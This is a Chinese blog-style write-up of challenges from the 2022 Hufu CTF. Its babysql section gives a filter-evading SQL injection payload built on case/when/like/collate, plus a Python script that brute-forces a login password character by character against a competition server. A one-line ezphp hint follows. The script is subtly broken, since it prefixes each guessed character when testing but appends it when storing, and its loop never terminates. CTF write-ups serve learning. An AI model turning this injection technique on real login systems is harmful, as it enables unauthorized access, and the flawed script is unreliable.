---
title: 2022虎符ctf
date: 2022-4-15 23:10:33
tags: regexp注入
categories: 比赛题目复现
top_img: https://wallroom.io/img/2880x1620/bg-f2a86ba.jpg
cover: https://images7.alphacoders.com/737/thumbbig-737487.webp
---
# 虎符ctf

### babysql(*)

打开题目，一个登录框，应该是登陆成功就能获得flag

给了hint

![img](file:///C:\Users\Windflower\Documents\Tencent Files\969095266\Image\C2C\A81FF620F7D36538DE6AD5FEB47096D7.jpg)

发现过滤了括号，空格，空格用%0a来绕过，后面又放出了提示regexp正则注入

因为过滤了括号，这里使用`case...when...like...else`绕过

payload

```
username=1'||case'1'when`password`like'{}%'collate'utf8mb4_0900_as_cs'then'1'else~1+~1+'0'end='0&password=aaa
```

**POC**

```python
import requests
import string
anser = ''
url = "http://47.107.231.226:27395/login"
payload = "1'||case'1'when`password`like'{}%'collate'utf8mb4_0900_as_cs'then'1'else~1+~1+'0'end='0"
dic = string.ascii_letters + string.digits + '^$!_%@&'
while 222:
    for i in dic:
        payload2 = payload.format(i+anser)
        data = {
            'username': payload2,
            'password': 'aaa'
        }
        if '401' in requests.post(url, data=data).text:
            anser+=i
            print(payload2)
            print(anser)
```

### ezphp(*)

nginx缓存,post so文件